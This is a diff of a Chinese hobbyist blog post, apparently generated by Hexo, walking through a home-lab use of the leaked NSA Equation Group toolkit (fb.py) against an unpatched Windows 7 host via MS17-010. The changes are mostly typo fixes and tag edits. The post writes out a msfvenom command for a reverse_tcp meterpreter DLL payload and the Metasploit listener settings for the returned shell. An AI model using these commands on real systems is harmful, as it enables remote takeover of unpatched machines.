@@ -35,7 +35,7 @@
 <meta property="og:image" content="http://y00z.github.io/images/pasted-77.jpg">
 <meta property="og:image" content="http://y00z.github.io/images/pasted-78.jpg">
 <meta property="og:image" content="http://y00z.github.io/images/pasted-79.jpg">
-<meta property="og:updated_time" content="2017-04-16T07:24:40.582Z">
+<meta property="og:updated_time" content="2017-04-17T04:58:13.708Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="世界末日:黑掉全世界的0day">
 <meta name="twitter:description" content="前言
@@ -200,7 +200,7 @@
 </blockquote>
 <h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><blockquote>
 <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天凌晨网络上发生了一波核弹级爆炸，影子经纪人黑客组织(Shadow Brokers)又一次公布了方程式黑客组织（Equation Group）的武器库。方程式据称是美国安全局(NSA)下属的组织。</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;早在去年8月份，影子经纪人号称入侵了方程式并且窃取了大量的机密文件，并且公布了一部分机密文件以及0day，当时我也是刚刚找到工作，没怎么关注，当时也是看了一些文章，有一些cisco等路由器设备的0day，照成了后来的数已万计的路由器成肉鸡僵尸网络，ddos美国的域名商，致半个美国的网络瘫痪。<br><a id="more"></a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ok不多说了，我们来看一下今天公布的0day吧。win10以下所有的windows通杀，而且还是远程溢出攻击直接拿shell，还有传说中的3389远程溢出，是不是在瑟瑟发抖了呢，想想早在高二的时候刚刚入门网络的时候自己还是一个只知道抓鸡的小门生，2003服务器居多，当时多想有一个3389的溢出，只要开了3389就可以直接拿下的，如今居然实现了。好了，下面一起来看看这个屌炸天的武器库吧。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;早在去年8月份，影子经纪人号称入侵了方程式并且窃取了大量的机密文件，并且公布了一部分机密文件以及0day，当时我也是刚刚找到工作，没怎么关注，当时也是看了一些文章，有一些cisco等路由器设备的0day，造成了后来的数已万计的路由器成肉鸡僵尸网络，ddos美国的域名商，致半个美国的网络瘫痪。<br><a id="more"></a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ok不多说了，我们来看一下今天公布的0day吧。win10以下所有的windows通杀，而且还是远程溢出攻击直接拿shell，还有传说中的3389远程溢出，是不是在瑟瑟发抖了呢，想想早在高二的时候刚刚入门网络的时候自己还是一个只知道抓鸡的小门生，2003服务器居多，当时多想有一个3389的exp，只要开了3389就可以直接拿下的，如今居然实现了。好了，下面一起来看看这个屌炸天的武器库吧。</p>
 </blockquote>
 <p>ps:这个文章其实可以早一些时间发出来，我这个电脑12年入手的到现在已经跟随了我5年时间，开3个虚拟机太特么卡了，实验到一半就卡死重启，这让我换mbp的心更坚定了。</p>
 <h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
@@ -209,7 +209,7 @@
 </ul>
 <p>靶机 win7<br><img src="/images/pasted-69.jpg" alt=""></p>
 <p>攻击者1<br><img src="/images/pasted-70.jpg" alt=""></p>
-<p>攻击者1<br><img src="/images/pasted-71.jpg" alt=""></p>
+<p>攻击者2<br><img src="/images/pasted-71.jpg" alt=""></p>
 <h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>下载解压后切换到windows目录执行python fb.py<br><strong><br>默认选项参数特别多，我这里只说重要需要填写的参数</strong></p>
 <p>输入靶机ip和攻击者ip以及选择是否开启本地监听。</p>
 <p><img src="/images/pasted-72.jpg" alt=""></p>
@@ -225,12 +225,9 @@
 <p><img src="/images/pasted-77.jpg" alt=""></p>
 <p>然后选择运行我们的payload文件，我们用msf来生成payload文件，在前面的安卓后门一章中也有讲过生成payload。</p>
 <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5554 -f dll &gt; s.dll
-</code></pre><p>如果电脑是32位的就去掉x64/，默认生成的就是32位的<br><br><br>然后再启动配置msf，并监听反弹的shell。</p>
-<pre><code>msf &gt; use exploit/multi/handle
-msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_Tcp
-msf exploit(handler) &gt; set LHOST 192.168.1.102
-msf exploit(handler) &gt; set LPORT 5554
-</code></pre><p>选择我们的payload之后继续一路回车，然后如果看到了success，就说明溢出成功了。</p>
+</code></pre><p>如果电脑是32位的就去掉x64/，默认生成的就是32位的</p>
+<p>然后再启动配置msf，并监听反弹的shell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handle</div><div class="line">msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_Tcp</div><div class="line">msf exploit(handler) &gt; set LHOST 192.168.1.102</div><div class="line">msf exploit(handler) &gt; set LPORT 5554</div></pre></td></tr></table></figure></p>
+<p>选择我们的payload之后继续一路回车，然后如果看到了success，就说明溢出成功了。</p>
 <p><img src="/images/pasted-78.jpg" alt=""></p>
 <p>再来看看我们监听的反弹shell</p>
 <p><img src="/images/pasted-79.jpg" alt=""></p>
@@ -239,7 +236,7 @@ msf exploit(handler) &gt; set LPORT 5554
 <p>可惜我没有服务器，只能做做内网测试。与此同时公布漏洞的十多个小时中，微软终于出了<a href="https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/" target="_blank" rel="external">补丁</a><br>并且把此漏洞定为编号MS17-010，win10以及更新布丁后的windows将不受影响。</p>
 </blockquote>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
-<p>这个武器库确实厉害，把远程溢出攻击简化成如此简单。这只是NSA武器库的冰山一角，想想美国的网络安全真的是领先我们几个世纪啊，每年各种黑客国际大会比赛几乎都是中国拿的冠军，原来是美国黑客压根就没参加。<br>ps：这个武器库和msf很像，但是没有msf好用，默认选项太多，也许是msf用习惯了吧。</p>
+<p>这个武器库确实厉害，指哪儿打哪儿，把远程溢出攻击简化成如此简单。这只是NSA武器库的冰山一角，想想美国的网络安全真的是领先我们几个世纪啊，然而每年各种黑客国际大会比赛几乎都是中国拿的冠军，原来是美国黑客压根就没参加。<br>ps：这个武器库和msf很像，但是没有msf好用，默认选项太多，也许是msf用习惯了吧。</p>
 </blockquote>
 <p>下载地址：</p>
 <blockquote>
@@ -361,6 +358,15 @@ msf exploit(handler) &gt; set LPORT 5554
   
 <nav id="article-nav">
   
+    <a href="/2017/04/21/React-Native狗狗说项目-NodeJs服务器/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          React-Native狗狗说项目+NodeJs服务器
+        
+      </div>
+    </a>
+  
   
     <a href="/2017/04/15/内网王者之会话劫持/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">内网王者之会话劫持</div>
@@ -471,15 +477,11 @@ msf exploit(handler) &gt; set LPORT 5554
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">NodeJs</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">安卓</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">nodejs</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -487,7 +489,7 @@ msf exploit(handler) &gt; set LPORT 5554
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">反编译</a>
+                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -495,7 +497,15 @@ msf exploit(handler) &gt; set LPORT 5554
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">反编译</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">小程序</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">路由器</a>
               </li>
             
             <div class="clearfix"></div>
